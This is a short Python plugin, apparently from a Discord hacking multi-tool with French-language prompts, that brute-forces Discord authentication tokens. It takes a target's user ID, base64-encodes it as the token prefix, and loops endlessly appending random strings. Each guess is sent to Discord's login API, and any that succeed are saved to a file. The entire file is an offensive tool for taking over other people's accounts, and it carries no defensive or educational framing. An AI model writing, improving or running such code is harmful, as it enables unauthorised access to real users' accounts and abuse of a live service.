from assets.plugin.common.base import *

def tokenbruteforce():

    rpc("Token Bruteforce")
    clear()
    tbf_banner()
    id_to_token = str(b64encode((input(f"{y}[{b}#{y}]{w}Entrez l'ID de votre cible ici\n>>> ")).encode("ascii")))[2:-1]
    print("=~=~=~=")

    while id_to_token == id_to_token:
        token = f'{id_to_token}.' + ('').join(choices(ascii_letters + digits, k=4)) + '.' + ('').join(choices(ascii_letters + digits, k=25))
        headers={'Authorization': token}
        login = get('https://discordapp.com/api/v9/auth/login', headers=headers)
        
        try:
            if login.status_code == 200:
                print(f'{v}[+]{w} VALID: {token}')
                with open('bruteforced_tokens.txt', "a+") as f:
                    f.write(f'{token}\n')
            else:
                print(f'{y}[-]{w} INVALID: {token}')
        finally:
            pass